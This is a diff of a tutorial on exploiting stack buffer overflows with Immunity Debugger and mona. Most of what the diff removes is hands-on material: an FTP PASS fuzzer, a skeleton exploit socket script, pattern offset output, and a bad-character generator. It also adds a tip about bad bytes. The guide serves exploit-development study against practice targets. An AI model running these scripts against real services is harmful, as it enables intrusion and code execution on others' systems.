@@ -45,120 +45,6 @@ In Immunity Debugger, type the following to set a working directory for mona.
 
     !mona config -set workingfolder c:\mona\%p
 
-Fuzzing
-=======
-
-The following Python script can be modified and used to fuzz remote entry points to an application. It will send increasingly long buffer strings in the hope that one eventually crashes the application.
-
-.. code-block:: python
-
-    import socket, time, sys
-
-    ip = "10.0.0.1"
-    port = 21
-    timeout = 5
-
-    # Create an array of increasing length buffer strings.
-    buffer = []
-    counter = 100
-    while len(buffer) < 30:
-        buffer.append("A" * counter)
-        counter += 100
-
-    for string in buffer:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(timeout)
-            connect = s.connect((ip, port))
-            s.recv(1024)
-            s.send("USER username\r\n")
-            s.recv(1024)
-
-            print("Fuzzing PASS with %s bytes" % len(string))
-            s.send("PASS " + string + "\r\n")
-            s.recv(1024)
-            s.send("QUIT\r\n")
-            s.recv(1024)
-            s.close()
-        except:
-            print("Could not connect to " + ip + ":" + str(port))
-            sys.exit(0)
-        time.sleep(1)
-
-Check that the EIP register has been overwritten by A's (\\x41). Make a note of any other registers that have either been overwritten, or are pointing to space in memory which has been overwritten.
-
-Crash Replication & Controlling EIP
-===================================
-
-The following skeleton exploit code can be used for the rest of the buffer overflow exploit:
-
-.. code-block:: python
-
-    import socket
-    
-    ip = "10.0.0.1"
-    port = 21
-    
-    prefix = ""
-    offset = 0
-    overflow = "A" * offset
-    retn = ""
-    padding = ""
-    payload = ""
-    postfix = ""
-    
-    buffer = prefix + overflow + retn + padding + payload + postfix
-    
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    try:
-        s.connect((ip, port))
-        print("Sending evil buffer...")
-        s.send(buffer + "\r\n")
-        print("Done!")
-    except:
-        print("Could not connect.")
-
-Using the buffer length which caused the crash, generate a unique buffer so we can determine the offset in the pattern which overwrites the EIP register, and the offset in the pattern to which other registers point. Create a pattern that is 400 bytes larger than the crash buffer, so that we can determine whether our shellcode can fit immediately. If the larger buffer doesn't crash the application, use a pattern equal to the crash buffer length and slowly add more to the buffer to find space.
-
-.. code-block:: none
-
-    $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
-    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
-
-While the unique buffer is on the stack, use mona's findmsp command, with the distance argument set to the pattern length.
-
-.. code-block:: none
-
-    !mona findmsp -distance 600
-    ...
-    [+] Looking for cyclic pattern in memory
-    Cyclic pattern (normal) found at 0x005f3614 (length 600 bytes)
-    Cyclic pattern (normal) found at 0x005f4a40 (length 600 bytes)
-    Cyclic pattern (normal) found at 0x017df764 (length 600 bytes)
-    EIP contains normal pattern : 0x78413778 (offset 112)
-    ESP (0x017dfa30) points at offset 116 in normal pattern (length 484)
-    EAX (0x017df764) points at offset 0 in normal pattern (length 600)
-    EBP contains normal pattern : 0x41367841 (offset 108)
-    ...
-
-Note the EIP offset (112) and any other registers that point to the pattern, noting their offsets as well. It seems like the ESP register points to the last 484 bytes of the pattern, which is enough space for our shellcode.
-
-Create a new buffer using this information to ensure that we can control EIP:
-
-.. code-block:: none
-
-    prefix = ""
-    offset = 112
-    overflow = "A" * offset
-    retn = "BBBB"
-    padding = ""
-    payload = "C" * (600-112-4)
-    postfix = ""
-    
-    buffer = prefix + overflow + retn + padding + payload + postfix
-
-Crash the application using this buffer, and make sure that EIP is overwritten by B's (\\x42) and that the ESP register points to the start of the C's (\\x43).
 
 Finding Bad Characters
 ======================
@@ -169,18 +55,6 @@ Generate a bytearray using mona, and exclude the null byte (\\x00) by default. N
 
     !mona bytearray -b "\x00"
 
-Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \\x01 to \\xff:
-
-.. code-block:: python
-
-    #!/usr/bin/env python
-    from __future__ import print_function
-
-    for x in range(1, 256):
-        print("\\x" + "{:02x}".format(x), end='')
-
-    print()
-
 Put the string of bad chars before the C's in your buffer, and adjust the number of C's to compensate:
 
 .. code-block:: none
@@ -189,6 +63,8 @@ Put the string of bad chars before the C's in your buffer, and adjust the number
     payload = badchars + "C" * (600-112-4-255)
 
 Crash the application using this buffer, and make a note of the address to which ESP points. This can change every time you crash the application, so get into the habit of copying it from the register each time.
+
+Keep in mind that bad bytes will affect their trailing neighbor so try only removing the first and then retrying.
 
 Use the mona compare command to reference the bytearray you generated, and the address to which ESP points:
 
@@ -242,9 +118,3 @@ Final Buffer
     
     buffer = prefix + overflow + retn + padding + payload + postfix
 
-Buffer Overflow Practice
-========================
-
-* https://github.com/justinsteven/dostackbufferoverflowgood
-* https://github.com/stephenbradshaw/vulnserver
-* https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/
